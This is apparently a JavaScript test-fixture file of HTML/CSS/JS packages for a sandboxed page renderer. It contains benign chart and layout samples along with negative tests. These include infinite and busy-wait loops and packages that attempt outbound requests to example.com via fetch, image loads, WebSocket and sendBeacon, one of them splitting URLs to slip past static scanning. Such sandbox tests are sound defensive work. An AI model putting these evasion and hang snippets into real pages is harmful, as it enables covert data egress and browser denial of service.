import { FROZEN_SCHEMA_VERSION } from '../resource/frozen-contract.mjs';

export const SAVED_COMPLEX_PACKAGE = {
  schema_version: FROZEN_SCHEMA_VERSION,
  html: `<section data-shine-node="n_title">
  <h1 data-shine-node="n_headline">已保存经营复盘</h1>
  <svg viewBox="0 0 120 40" data-shine-node="n_mark" aria-hidden="true"><path d="M8 32 Q 40 4 112 28" fill="none" stroke="#805D9D" stroke-width="6"/></svg>
  <canvas data-shine-region="r_chart" width="320" height="120"></canvas>
</section>`,
  css: `section{font:600 28px/1.3 "Noto Sans SC",sans-serif;color:#201426}
canvas{display:block;width:320px;height:120px;background:linear-gradient(180deg,#F2FFDC,#fff)}
@keyframes rise{from{transform:translateY(6px)}to{transform:translateY(0)}}
h1{animation:rise .4s ease both}`,
  js: `(function(){
  const canvas = document.querySelector('canvas');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  ctx.fillStyle = '#805D9D';
  ctx.fillRect(20, 40, 40, 60);
  ctx.fillRect(80, 20, 40, 80);
  ctx.fillRect(140, 50, 40, 50);
  window.__fpSavedReady = true;
})();`,
  resources: [],
  node_map: [
    { node_id: 'n_title', kind: 'static_element', selector: "[data-shine-node='n_title']" },
    { node_id: 'n_headline', kind: 'static_element', selector: "[data-shine-node='n_headline']" },
    { node_id: 'n_mark', kind: 'static_element', selector: "[data-shine-node='n_mark']" },
    { node_id: 'r_chart', kind: 'dynamic_region', selector: "[data-shine-region='r_chart']" },
  ],
};

export const MAGAZINE_PACKAGE = {
  schema_version: FROZEN_SCHEMA_VERSION,
  html: `<article class="mag" data-shine-node="n_article">
  <header><p>SHINE / 经营观察</p><h1 data-shine-node="n_lead">从第一次购买，走向下一次选择。</h1></header>
  <figure data-shine-region="r_hero"><div class="bars"><i></i><i></i><i></i></div></figure>
</article>`,
  css: `.mag{display:grid;gap:24px;padding:32px;background:#FEFCFF;color:#09050D}
.bars{display:flex;align-items:flex-end;gap:12px;height:120px}
.bars i{flex:1;background:#805D9D;height:var(--h,40%)}
.bars i:nth-child(1){--h:48%}.bars i:nth-child(2){--h:72%}.bars i:nth-child(3){--h:96%}`,
  js: `document.querySelector('.mag')?.setAttribute('data-fp-ready','1');`,
  resources: [],
  node_map: [
    { node_id: 'n_article', kind: 'static_element', selector: "[data-shine-node='n_article']" },
    { node_id: 'n_lead', kind: 'static_element', selector: "[data-shine-node='n_lead']" },
    { node_id: 'r_hero', kind: 'dynamic_region', selector: "[data-shine-region='r_hero']" },
  ],
};

export const INTERACTIVE_CHART_PACKAGE = {
  schema_version: FROZEN_SCHEMA_VERSION,
  html: `<div data-shine-region="r_plot"><button type="button" data-shine-node="n_toggle">切换</button><canvas width="240" height="120"></canvas></div>`,
  css: `canvas{border:1px solid rgba(128,93,157,.3)}`,
  js: `(function(){
  let on = true;
  const canvas = document.querySelector('canvas');
  const ctx = canvas.getContext('2d');
  function draw(){ ctx.clearRect(0,0,240,120); ctx.fillStyle = on ? '#805D9D' : '#9A8BA4'; ctx.beginPath(); ctx.arc(120,60,40,0,Math.PI*2); ctx.fill(); }
  document.querySelector('button').onclick = () => { on = !on; draw(); };
  draw();
})();`,
  resources: [],
  node_map: [
    { node_id: 'n_toggle', kind: 'static_element', selector: "[data-shine-node='n_toggle']" },
    { node_id: 'r_plot', kind: 'dynamic_region', selector: "[data-shine-region='r_plot']" },
  ],
};

export const RUNAWAY_LOOP_PACKAGE = {
  schema_version: FROZEN_SCHEMA_VERSION,
  html: '<p data-shine-node="n_run">失控循环样本</p>',
  css: 'p{color:#FF7D91}',
  js: 'while (true) {}',
  resources: [],
  node_map: [{ node_id: 'n_run', kind: 'static_element', selector: "[data-shine-node='n_run']" }],
};

export const RUNAWAY_YIELDING_PACKAGE = {
  schema_version: FROZEN_SCHEMA_VERSION,
  html: '<p data-shine-node="n_spin">让步忙循环样本</p>',
  css: 'p{color:#F59E0B}',
  js: '(function spin(){ const end = Date.now() + 50; while (Date.now() < end) {} setTimeout(spin, 0); })();',
  resources: [],
  node_map: [{ node_id: 'n_spin', kind: 'static_element', selector: "[data-shine-node='n_spin']" }],
};

export const LEAK_ATTEMPT_PACKAGE = {
  schema_version: FROZEN_SCHEMA_VERSION,
  html: '<p data-shine-node="n_leak">外联负测</p>',
  css: 'p{color:#674482}',
  js: "fetch('https://example.com/');",
  resources: [],
  node_map: [{ node_id: 'n_leak', kind: 'static_element', selector: "[data-shine-node='n_leak']" }],
};

/** Static scan may miss concatenated URLs; Chrome CSP/proxy is the actual egress proof. */
export const DYNAMIC_LEAK_PACKAGE = {
  schema_version: FROZEN_SCHEMA_VERSION,
  html: '<p data-shine-node="n_leak">动态外联负测</p>',
  css: 'p{color:#674482}',
  js: `(function(){
    const remote = ['ht','tps://example.com/'].join('');
    window.__fpLeak = { fetch: 0, img: 0, ws: 0, beacon: 0, errors: [] };
    fetch(remote).then(function(){ window.__fpLeak.fetch += 1; }).catch(function(){ window.__fpLeak.errors.push('fetch-remote'); });
    try { var img = new Image(); img.src = remote + 'favicon.ico'; } catch (e) { window.__fpLeak.errors.push('img'); }
    try { new WebSocket(['ws','s://example.com/'].join('')); } catch (e) { window.__fpLeak.errors.push('ws'); }
    try { navigator.sendBeacon(remote, 'x'); } catch (e) { window.__fpLeak.errors.push('beacon'); }
  })();`,
  resources: [],
  node_map: [{ node_id: 'n_leak', kind: 'static_element', selector: "[data-shine-node='n_leak']" }],
};
